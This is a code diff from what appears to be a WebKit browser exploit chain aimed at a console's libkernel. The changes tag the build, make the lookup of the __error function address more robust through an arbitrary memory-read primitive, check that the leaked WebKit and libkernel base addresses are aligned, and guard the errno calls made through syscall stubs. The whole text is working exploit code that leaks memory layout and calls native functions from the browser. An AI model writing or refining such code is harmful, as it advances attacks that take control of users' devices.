@@ -131,9 +131,12 @@ let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false
 
 let allDone = false;
 
+const CHAIN_BUILD = "chain_1352-2026-03-26b";
+
 (async function () {
     let p = null;
     try {
+        mark("CHAIN-BUILD", CHAIN_BUILD);
 
         const NUM_IOV_WORKER = params.has("iov")
             ? parseInt(params.get("iov"), 10) : 4;
@@ -365,13 +368,19 @@ let allDone = false;
             .add32(off.wk_JSFunction_m_function));
         const webkitBase = MEASURED.webkit
             || nativeFn.sub32(off.wk_expm1_builtin);
-        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
+        let errorFn = null;
+        if (MEASURED.libkernel && off.k__error)
+            errorFn = MEASURED.libkernel.add32(off.k__error);
+        if (!errorFn && off.wk___imp___error) {
+            try { errorFn = p.read8(webkitBase.add32(off.wk___imp___error)); } catch (_) { }
+        }
         const libkernelBase = MEASURED.libkernel
-            || errorFn.sub32(off.k__error);
+            || (errorFn ? errorFn.sub32(off.k__error) : null);
         mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase
             + (MEASURED.webkit ? " (measured)" : "")
             + (MEASURED.libkernel ? " (measured)" : ""));
-        const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
+        mark("ERRNO-FN", errorFn ? String(errorFn) : "MISSING");
+        const aligned = v => v && v.hi > 0 && (v.low & 0x3fff) === 0;
         if (!check("module-bases-0x4000-aligned",
             aligned(webkitBase) && aligned(libkernelBase), "")) return;
 
@@ -503,6 +512,7 @@ let allDone = false;
         }
         const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
         function errno() {
+            if (!errorFn) return -1;
             const r = callAddr(errorFn, []);
             const a = new int64(r.lo, r.hi);
             return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
